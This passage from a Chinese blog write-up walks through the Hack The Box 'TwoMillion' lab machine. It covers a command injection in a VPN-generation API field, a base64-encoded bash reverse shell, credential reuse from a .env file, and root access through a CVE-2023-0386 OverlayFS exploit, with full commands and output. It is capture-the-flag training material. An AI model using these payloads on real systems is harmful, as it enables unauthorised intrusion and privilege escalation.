+<p>22、通过查看官网PDF文档，原来是我burp没有回显的原因导致了，用curl在命令行是成功回显出来的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie <span class="hljs-string">&quot;PHPSESSID=c9fokugdh8h75hf5nkorgju3f7&quot;</span> --header <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> --data <span class="hljs-string">&#x27;&#123;&quot;username&quot;:&quot;shiyan;id;&quot;&#125;&#x27;</span>     <br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br></code></pre></td></tr></table></figure>
+
+<p>23、那我们就开始构造反弹shell的命令进行获取 www-data 的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ nc -lvnp 10086<br>listening on [any] 10086 ...<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.114/10086 0&gt;&amp;1&#x27;</span> | <span class="hljs-built_in">base64</span><br>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvMTAwODYgMD4mMQo=<br><br>┌──(kali㉿kali)-[~]<br>└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie <span class="hljs-string">&quot;PHPSESSID=an8gg742b8nidj4gn233jcd0oc&quot;</span> --header <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> --data <span class="hljs-string">&#x27;&#123;&quot;username&quot;:&quot;test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvMTAwODYgMD4mMQo= | base64 -d | bash;&quot;&#125;&#x27;</span><br><br>┌──(kali㉿kali)-[~]<br>└─$ nc -lvnp 10086<br>listening on [any] 10086 ...<br>connect to [10.10.14.114] from (UNKNOWN) [10.10.11.221] 46286<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1157): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@2million:~/html$<br><br></code></pre></td></tr></table></figure>
+
+<p>24、到这里我们就成功获取到当前网站的shell了，根据上述的引导，我们查看下环境变量的文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@2million:~/html$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 56<br>drwxr-xr-x 10 root root 4096 Dec  1 14:50 .<br>drwxr-xr-x  3 root root 4096 Jun  6 10:22 ..<br>-rw-r--r--  1 root root   87 Jun  2 18:56 .<span class="hljs-built_in">env</span><br>-rw-r--r--  1 root root 1237 Jun  2 16:15 Database.php<br>-rw-r--r--  1 root root 2787 Jun  2 16:15 Router.php<br>drwxr-xr-x  5 root root 4096 Dec  1 14:50 VPN<br>drwxr-xr-x  2 root root 4096 Jun  6 10:22 assets<br>drwxr-xr-x  2 root root 4096 Jun  6 10:22 controllers<br>drwxr-xr-x  5 root root 4096 Jun  6 10:22 css<br>drwxr-xr-x  2 root root 4096 Jun  6 10:22 fonts<br>drwxr-xr-x  2 root root 4096 Jun  6 10:22 images<br>-rw-r--r--  1 root root 2692 Jun  2 18:57 index.php<br>drwxr-xr-x  3 root root 4096 Jun  6 10:22 js<br>drwxr-xr-x  2 root root 4096 Jun  6 10:22 views<br>www-data@2million:~/html$ <span class="hljs-built_in">cat</span> .<span class="hljs-built_in">env</span><br><span class="hljs-built_in">cat</span> .<span class="hljs-built_in">env</span><br>DB_HOST=127.0.0.1<br>DB_DATABASE=htb_prod<br>DB_USERNAME=admin<br>DB_PASSWORD=SuperDuperPass123<br>www-data@2million:~/html$<br>www-data@2million:~/html$ <span class="hljs-built_in">ls</span> -la /home<br><span class="hljs-built_in">ls</span> -la /home<br>total 12<br>drwxr-xr-x  3 root  root  4096 Jun  6 10:22 .<br>drwxr-xr-x 19 root  root  4096 Jun  6 10:22 ..<br>drwxr-xr-x  4 admin admin 4096 Jun  6 10:22 admin<br>www-data@2million:~/html$ <br></code></pre></td></tr></table></figure>
+
+<p>25、好像是账号密码，我们ssh登录下试试看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ ssh admin@10.10.11.221      <br>admin@10.10.11.221<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Fri Dec  1 02:55:21 PM UTC 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:           0.0</span><br><span class="hljs-string">  Usage of /:            73.4% of 4.82GB</span><br><span class="hljs-string">  Memory usage:          8%</span><br><span class="hljs-string">  Swap usage:            0%</span><br><span class="hljs-string">  Processes:             221</span><br><span class="hljs-string">  Users logged in:       0</span><br><span class="hljs-string">  IPv4 address for eth0: 10.10.11.221</span><br><span class="hljs-string">  IPv6 address for eth0: dead:beef::250:56ff:feb9:f6bf</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Expanded Security Maintenance for Applications is not enabled.</span><br><span class="hljs-string"></span><br><span class="hljs-string">0 updates can be applied immediately.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Enable ESM Apps to receive additional future security updates.</span><br><span class="hljs-string">See https://ubuntu.com/esm or run: sudo pro status</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string"></span><br><span class="hljs-string">You have mail.</span><br><span class="hljs-string">Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6</span><br><span class="hljs-string">To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.</span><br><span class="hljs-string">See &quot;man sudo_root&quot; for details.</span><br><span class="hljs-string"></span><br><span class="hljs-string">admin@2million:~$ </span><br></code></pre></td></tr></table></figure>
+
+<p>26、至此，我们成功获取到了用户的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@2million:~$ <span class="hljs-built_in">cat</span> user.txt <br>c164ff2cf362ca0f48fbb7524b497a1e<br>admin@2million:~$ <br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>27、常规的，我们看下是否能从sudo错配获取到一些信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@2million:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> admin: <br>Sorry, user admin may not run sudo on localhost.<br>admin@2million:~$ <br></code></pre></td></tr></table></figure>
+
+<p>28、看来是GG了，这里什么也获取不到</p>
+<p>29、感觉这个靶场有点CTF的感觉了，没有想象中的那么好提权，需要枚举出来一些暗示，或者直接看引导模式，但是看了引导又感觉前后没啥大的关联，不过在看一个大佬的文章时，觉得他的这个还是有些用处的命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@2million:~$ find / -<span class="hljs-built_in">type</span> f -group admin 2&gt;/dev/null | grep -v /sys | grep -v /proc<br>/home/admin/.cache/motd.legal-displayed<br>/home/admin/.profile<br>/home/admin/user.txt<br>/home/admin/.bash_logout<br>/home/admin/.bashrc<br>/var/mail/admin<br>admin@2million:~$ <br></code></pre></td></tr></table></figure>
+
+<p>30、通过查看当前用户组的文件，发现了一个可疑的文件，邮箱文件，接下来进行查看该文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@2million:~$ <span class="hljs-built_in">cat</span> /var/mail/admin<br>From: ch4p &lt;ch4p@2million.htb&gt;<br>To: admin &lt;admin@2million.htb&gt;<br>Cc: g0blin &lt;g0blin@2million.htb&gt;<br>Subject: Urgent: Patch System OS<br>Date: Tue, 1 June 2023 10:45:22 -0700<br>Message-ID: &lt;9876543210@2million.htb&gt;<br>X-Mailer: ThunderMail Pro 5.2<br><br>Hey admin,<br><br>I<span class="hljs-string">&#x27;m know you&#x27;</span>re working as fast as you can to <span class="hljs-keyword">do</span> the DB migration. While we<span class="hljs-string">&#x27;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can&#x27;</span>t get popped by that.<br><br>HTB Godfather<br>admin@2million:~$ <br></code></pre></td></tr></table></figure>
+
+<p>31、根据邮件里的提示，看起来是让我们直接找一个Linux的内核漏洞，还是今年的漏洞。</p>
+<p><img src="http://sh1yan.top/photo/TwoMillion-htb-writeup/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>32、看来是发现了一个今年的漏洞的，但是也看到很多同靶机的writeup的文章，不过我们继续用谷歌搜索下该CVE的poc吧</p>
+<p><code>https://github.com/sxlmnwb/CVE-2023-0386</code></p>
+<p>33、我们把这个exp上传到靶机上，进行提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ scp CVE-2023-0386-master.zip admin@10.10.11.221:/home/admin/CVE-2023-0386-master.zip<br>admin@10.10.11.221<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">CVE-2023-0386-master.zip                   100%   11KB  19.3KB/s   00:00 </span><br><span class="hljs-string"></span><br><span class="hljs-string">admin@2million:~$ cp CVE-2023-0386-master.zip /tmp/</span><br><span class="hljs-string">admin@2million:~$ cd tmp</span><br><span class="hljs-string">-bash: cd: tmp: No such file or directory</span><br><span class="hljs-string">admin@2million:~$ cd /tmp</span><br><span class="hljs-string">admin@2million:/tmp$ unzip CVE-2023-0386-master.zip </span><br><span class="hljs-string">Archive:  CVE-2023-0386-master.zip</span><br><span class="hljs-string">737d8f4af6b18123443be2aed97ade5dc3757e63</span><br><span class="hljs-string">   creating: CVE-2023-0386-master/</span><br><span class="hljs-string">  inflating: CVE-2023-0386-master/Makefile  </span><br><span class="hljs-string">  inflating: CVE-2023-0386-master/README.md  </span><br><span class="hljs-string">  inflating: CVE-2023-0386-master/exp.c  </span><br><span class="hljs-string">  inflating: CVE-2023-0386-master/fuse.c  </span><br><span class="hljs-string">  inflating: CVE-2023-0386-master/getshell.c  </span><br><span class="hljs-string">   creating: CVE-2023-0386-master/ovlcap/</span><br><span class="hljs-string"> extracting: CVE-2023-0386-master/ovlcap/.gitkeep  </span><br><span class="hljs-string">   creating: CVE-2023-0386-master/test/</span><br><span class="hljs-string">  inflating: CVE-2023-0386-master/test/fuse_test.c  </span><br><span class="hljs-string">  inflating: CVE-2023-0386-master/test/mnt  </span><br><span class="hljs-string">  inflating: CVE-2023-0386-master/test/mnt.c  </span><br><span class="hljs-string">admin@2million:/tmp$ cd CVE-2023-0386-master/</span><br><span class="hljs-string">admin@2million:/tmp/CVE-2023-0386-master$ make all</span><br><span class="hljs-string">gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl</span><br><span class="hljs-string">fuse.c: In function ‘read_buf_callback’:</span><br><span class="hljs-string">fuse.c:106:21: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘off_t’ &#123;aka ‘long int’&#125; [-Wformat=]</span><br><span class="hljs-string">  106 |     printf(&quot;offset %d\n&quot;, off);</span><br><span class="hljs-string">      |                    ~^     ~~~</span><br><span class="hljs-string">      |                     |     |</span><br><span class="hljs-string">      |                     int   off_t &#123;aka long int&#125;</span><br><span class="hljs-string">      |                    %ld</span><br><span class="hljs-string">fuse.c:107:19: warning: format ‘%d’ expects argument of type ‘int’, but argument 2 has type ‘size_t’ &#123;aka ‘long unsigned int’&#125; [-Wformat=]</span><br><span class="hljs-string">  107 |     printf(&quot;size %d\n&quot;, size);</span><br><span class="hljs-string">      |                  ~^     ~~~~</span><br><span class="hljs-string">      |                   |     |</span><br><span class="hljs-string">      |                   int   size_t &#123;aka long unsigned int&#125;</span><br><span class="hljs-string">      |                  %ld</span><br><span class="hljs-string">fuse.c: In function ‘main’:</span><br><span class="hljs-string">fuse.c:214:12: warning: implicit declaration of function ‘read’; did you mean ‘fread’? [-Wimplicit-function-declaration]</span><br><span class="hljs-string">  214 |     while (read(fd, content + clen, 1) &gt; 0)</span><br><span class="hljs-string">      |            ^~~~</span><br><span class="hljs-string">      |            fread</span><br><span class="hljs-string">fuse.c:216:5: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]</span><br><span class="hljs-string">  216 |     close(fd);</span><br><span class="hljs-string">      |     ^~~~~</span><br><span class="hljs-string">      |     pclose</span><br><span class="hljs-string">fuse.c:221:5: warning: implicit declaration of function ‘rmdir’ [-Wimplicit-function-declaration]</span><br><span class="hljs-string">  221 |     rmdir(mount_path);</span><br><span class="hljs-string">      |     ^~~~~</span><br><span class="hljs-string">/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common&#x27;</span>:<br>(.text+0xaf4e): warning: Using <span class="hljs-string">&#x27;dlopen&#x27;</span> <span class="hljs-keyword">in</span> statically linked applications requires at runtime the shared libraries from the glibc version used <span class="hljs-keyword">for</span> linking<br>gcc -o exp exp.c -lcap<br>gcc -o gc getshell.c<br>admin@2million:/tmp/CVE-2023-0386-master$ ./fuse ./ovlcap/lower ./gc &amp;<br>[1] 3849<br>admin@2million:/tmp/CVE-2023-0386-master$ [+] len of gc: 0x3ee0<br><br>admin@2million:/tmp/CVE-2023-0386-master$ <span class="hljs-built_in">ls</span><br>exp  exp.c  fuse  fuse.c  gc  getshell.c  Makefile  ovlcap  README.md  <span class="hljs-built_in">test</span><br>admin@2million:/tmp/CVE-2023-0386-master$ ./exp<br>uid:1000 gid:1000<br>[+] mount success<br>[+] readdir<br>[+] getattr_callback<br>/file<br>total 8<br>drwxrwxr-x 1 root   root     4096 Dec  1 15:49 .<br>drwxrwxr-x 6 root   root     4096 Dec  1 15:49 ..<br>-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file<br>[+] open_callback<br>/file<br>[+] <span class="hljs-built_in">read</span> buf callback<br>offset 0<br>size 16384<br>path /file<br>[+] open_callback<br>/file<br>[+] open_callback<br>/file<br>[+] ioctl callback<br>path /file<br>cmd 0x80086601<br>[+] exploit success!<br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>root@2million:/tmp/CVE-2023-0386-master<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(admin)<br>root@2million:/tmp/CVE-2023-0386-master<span class="hljs-comment"># cat /root/root.txt</span><br>bb5dd763af38023978d9490e97622cd7<br>root@2million:/tmp/CVE-2023-0386-master<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>34、至此，我们拿到了root的权限，在这个寻找exp和运行exp的过程中，还是产生了，很多问题的，比如我一直运行不成功，最后发现我仿照着官方PDF里的命令，增加了<code>&amp;</code>结果就成功了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fuse ./ovlcap/lower ./gc &amp;<br></code></pre></td></tr></table></figure>
+
+<p>35、说实话，打这个靶机，总感觉像CTF一样，有点讨厌的感觉，捂脸。。。</p>
+<p>36、小插曲，当靶场结束的时候，没想到引导模式还没结束，我跟着引导模式答疑了，下感觉还是有点意思的小发现。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[Alternative Priv Esc] TwoMillion 上的 GLIBC 库的版本是什么？<br>2.35<br>查询操作：ldd --version<br><br>[Alternative Priv Esc] GNU C 动态加载器中的 2023 缓冲区溢出漏洞的 CVE ID 是什么？<br>CVE-2023-4911<br><br>[Alternative Priv Esc] 使用 admin 或 www-data 的 shell，找到 Looney Tunables 的 POC。触发缓冲区溢出的环境变量的名称是什么？回答完这个问题后，运行 POC 并以 root 身份获取 shell。<br>GLIBC_TUNABLES<br><br></code></pre></td></tr></table></figure>
+
+<p>37、然后我还发现了官方的网站推文，嘿嘿。</p>
+<p><code>https://www.hackthebox.com/blog/exploiting-the-looney-tunables-vulnerability-cve-2023-4911</code></p>
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/547</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TwoMillion-htb-writeup</div>
+      <div>https://sh1yan.top/2023/12/02/TwoMillion-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/03/Sense-htb-writeup/" title="Sense-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Sense-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/30/Broker-htb-writeup/" title="Broker-htb-writeup">
+                        <span class="hidden-mobile">Broker-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
